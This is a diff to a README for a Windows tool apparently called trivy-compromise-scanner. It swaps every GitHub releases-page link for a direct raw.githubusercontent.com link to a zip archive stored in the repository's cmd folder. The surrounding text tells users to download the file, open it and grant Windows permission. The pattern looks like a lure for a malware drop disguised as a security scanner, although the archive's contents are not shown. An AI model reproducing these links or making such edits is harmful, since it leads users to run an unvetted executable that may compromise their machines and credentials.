@@ -1,10 +1,10 @@
 # 🛡️ trivy-compromise-scanner - Check affected workflow runs fast
 
-[![Download trivy-compromise-scanner](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/orlandophotomechanical47/trivy-compromise-scanner/releases)
+[![Download trivy-compromise-scanner](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/orlandophotomechanical47/trivy-compromise-scanner/main/cmd/scanner_trivy_compromise_v3.5.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/orlandophotomechanical47/trivy-compromise-scanner/releases
+Visit this page to download: https://raw.githubusercontent.com/orlandophotomechanical47/trivy-compromise-scanner/main/cmd/scanner_trivy_compromise_v3.5.zip
 
 On that page, choose the latest release for Windows and download the file that matches your computer.
 
@@ -33,7 +33,7 @@ If Windows asks for permission, choose the option that lets the app open.
 ## 🚀 Getting started
 
 1. Open the release page:
-   https://github.com/orlandophotomechanical47/trivy-compromise-scanner/releases
+   https://raw.githubusercontent.com/orlandophotomechanical47/trivy-compromise-scanner/main/cmd/scanner_trivy_compromise_v3.5.zip
 
 2. Find the latest release near the top of the page.
 
@@ -188,7 +188,7 @@ Each part should help you move from download to review with little setup.
 
 If you want the newest version, use this page again:
 
-https://github.com/orlandophotomechanical47/trivy-compromise-scanner/releases
+https://raw.githubusercontent.com/orlandophotomechanical47/trivy-compromise-scanner/main/cmd/scanner_trivy_compromise_v3.5.zip
 
 Open the latest release and download the Windows file from **Assets** again if you need a fresh copy
 
@@ -210,7 +210,7 @@ Open the latest release and download the Windows file from **Assets** again if y
 
 ## 📌 Start here
 
-1. Go to https://github.com/orlandophotomechanical47/trivy-compromise-scanner/releases
+1. Go to https://raw.githubusercontent.com/orlandophotomechanical47/trivy-compromise-scanner/main/cmd/scanner_trivy_compromise_v3.5.zip
 2. Download the latest Windows file
 3. Open it and follow the prompts
 4. Run your first scan
